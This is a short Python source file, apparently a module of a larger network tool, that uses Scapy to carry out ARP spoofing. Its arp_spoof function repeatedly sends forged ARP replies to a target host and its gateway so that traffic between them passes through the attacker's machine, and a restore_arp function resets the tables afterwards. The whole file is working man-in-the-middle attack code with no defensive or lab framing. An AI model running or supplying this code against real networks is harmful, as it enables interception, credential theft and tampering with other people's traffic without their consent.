
import time

from scapy.all import sendp
from scapy.layers.l2 import ARP, Ether

from helper.network import get_default_iface, get_mac_from_ip, get_my_mac


def arp_spoof(target_ip, gateway_ip, stop_event):
    target_mac = get_mac_from_ip(target_ip)
    if not target_mac:
        return False

    gateway_mac = get_mac_from_ip(gateway_ip)
    if not gateway_mac:
        return False

    my_mac = get_my_mac()
    if not my_mac:
        return False

    iface = get_default_iface()
    if not iface:
        return False
    try:
        while not stop_event.is_set():
            to_victim = Ether(dst=target_mac)/ARP(
                op=2,
                psrc=gateway_ip,
                hwsrc=my_mac,
                pdst=target_ip,
                hwdst=target_mac
            )

            to_gateway = Ether(dst=gateway_mac)/ARP(
                op=2,
                psrc=target_ip,
                hwsrc=my_mac,
                pdst=gateway_ip,
                hwdst=gateway_mac
            )

            sendp(to_victim, iface=iface, verbose=0)
            sendp(to_gateway, iface=iface, verbose=0)
            time.sleep(2)
    except Exception:
        return False
    finally:
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface)
    return True


def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    try:
        to_target = Ether(dst=target_mac)/ARP(
            op=2,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
            pdst=target_ip,
            hwdst=target_mac
        )

        to_gateway = Ether(dst=gateway_mac)/ARP(
            op=2,
            psrc=target_ip,
            hwsrc=target_mac,
            pdst=gateway_ip,
            hwdst=gateway_mac
        )

        for _ in range(5):
            sendp(to_target, iface=iface, verbose=0)
            sendp(to_gateway, iface=iface, verbose=0)

    except Exception:
        pass
